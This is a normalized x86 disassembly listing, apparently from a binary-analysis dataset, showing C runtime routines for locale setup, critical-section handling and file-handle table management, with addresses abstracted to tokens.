cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_4381f8
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_4381f8
pop ecx
push 0xd
call sub_442c68
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_44289d
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_4381f8
pop ecx
sub_4428f4
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
je r-xdata
leave
retn
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_438ce6
mov esi [ ebp - 0x14 ]
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
mov eax 0x100
push 0x1
cmp [ ebp + 0x8 ] ax
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
lea edx [ ebp - 0x4 ]
push edx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
push eax
push ecx
call sub_43dbb4
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push [ ebp + 0x8 ]
call sub_44cdc0
pop ecx
test eax eax
movzx eax [ ebp + 0x8 ]
pop ecx
je r-xdata
movzx eax ax
jmp r-xdata
add ax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ esi + 0xcc ]
movzx eax [ ecx + eax ]
jmp r-xdata
pop esi
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_442994
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_43c04c
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_43f8c5
mov eax esi
sub_4429f7
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44b2a1
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_43c04c
test eax eax
je r-xdata
call sub_43c04c
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_442a37
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_442a52
push 0x10
push r--data
call sub_43f8e0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_442c68
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_442ae5
mov eax [ ebp - 0x1c ]
call sub_43f925
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_438a5b
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_4381f8
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_442aee
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_442ba6
push 0xc
push r--data
call sub_43f8e0
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_43fdf7
push 0x1e
call sub_43fc48
push 0xff
call sub_43b4aa
push 0x18
call sub_43ddd2
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_442c68
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_43c04c
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_43f925
retn
push edi
call sub_4381f8
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_4381f8
pop ecx
call sub_43c04c
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_442c5f
mov eax [ ebp - 0x1c ]
sub_442c68
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_442ba6
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_43b74c
sub_442c9b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_43c04c
mov [ eax ] 0x9
call sub_43c05f
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_442d1c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_43c04c
mov [ eax ] 0x9
call sub_43c05f
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_442da2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_43c05f
and [ eax ] 0x0
call sub_43c04c
mov [ eax ] 0x9
call sub_43c05f
and [ eax ] 0x0
call sub_43c04c
mov [ eax ] 0x9
call sub_43f8c5
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_442e0b
push 0xc
push r--data
call sub_43f8e0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_442c68
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_43f925
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_442ea1
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_442eaa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_442ed1
push 0x18
push r--data
call sub_43f8e0
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_442ba6
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_442c68
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_443061
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_43f925
retn
push 0x40
push 0x20
call sub_43de17
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_442e0b
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_442c68
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_442fa3
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_44306a
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
movzx ebx [ eax + 0x42 ]
push esi
mov esi ecx
movzx ecx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
push edi
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
push esi
push 0x37
push ebx
or edi eax
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push ebx
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
call sub_44a386
or edi eax
mov eax [ ebp - 0x4 ]
add esp 0x50
mov [ esi + 0xac ] eax
lea eax [ esi + 0xbc ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xc0 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xc4 ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xc8 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0xcc ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xd0 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xb8 ]
push eax
push 0x37
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xd8 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0xdc ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xe0 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xe4 ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xe8 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0xec ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xd4 ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xf0 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xf4 ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0xf8 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0xfc ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x100 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x104 ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0x108 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x10c ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x110 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x114 ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0x118 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x11c ]
push eax
push 0x4f
push ebx
push 0x2
lea eax [ ebp - 0xc ]
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x120 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x124 ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0x128 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x12c ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x130 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x134 ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0x138 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x13c ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x140 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x144 ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0x148 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x14c ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x150 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x154 ]
push eax
push 0x29
push ebx
push 0x2
pop ebx
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_44a386
add esp 0x50
or edi eax
lea eax [ esi + 0x158 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_44a386
or edi eax
lea eax [ esi + 0x15c ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_44a386
add esi 0x160
push esi
push 0x1003
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_44a386
add esp 0x3c
or eax edi
pop edi
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_443869
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_4381f8
push [ esi + 0x8 ]
call sub_4381f8
push [ esi + 0xc ]
call sub_4381f8
push [ esi + 0x10 ]
call sub_4381f8
push [ esi + 0x14 ]
call sub_4381f8
push [ esi + 0x18 ]
call sub_4381f8
push [ esi ]
call sub_4381f8
push [ esi + 0x20 ]
call sub_4381f8
push [ esi + 0x24 ]
call sub_4381f8
push [ esi + 0x28 ]
call sub_4381f8
push [ esi + 0x2c ]
call sub_4381f8
push [ esi + 0x30 ]
call sub_4381f8
push [ esi + 0x34 ]
call sub_4381f8
push [ esi + 0x1c ]
call sub_4381f8
push [ esi + 0x38 ]
call sub_4381f8
push [ esi + 0x3c ]
call sub_4381f8
add esp 0x40
push [ esi + 0x40 ]
call sub_4381f8
push [ esi + 0x44 ]
call sub_4381f8
push [ esi + 0x48 ]
call sub_4381f8
push [ esi + 0x4c ]
call sub_4381f8
push [ esi + 0x50 ]
call sub_4381f8
push [ esi + 0x54 ]
call sub_4381f8
push [ esi + 0x58 ]
call sub_4381f8
push [ esi + 0x5c ]
call sub_4381f8
push [ esi + 0x60 ]
call sub_4381f8
push [ esi + 0x64 ]
call sub_4381f8
push [ esi + 0x68 ]
call sub_4381f8
push [ esi + 0x6c ]
call sub_4381f8
push [ esi + 0x70 ]
call sub_4381f8
push [ esi + 0x74 ]
call sub_4381f8
push [ esi + 0x78 ]
call sub_4381f8
push [ esi + 0x7c ]
call sub_4381f8
add esp 0x40
push [ esi + 0x80 ]
call sub_4381f8
push [ esi + 0x84 ]
call sub_4381f8
push [ esi + 0x88 ]
call sub_4381f8
push [ esi + 0x8c ]
call sub_4381f8
push [ esi + 0x90 ]
call sub_4381f8
push [ esi + 0x94 ]
call sub_4381f8
push [ esi + 0x98 ]
call sub_4381f8
push [ esi + 0x9c ]
call sub_4381f8
push [ esi + 0xa0 ]
call sub_4381f8
push [ esi + 0xa4 ]
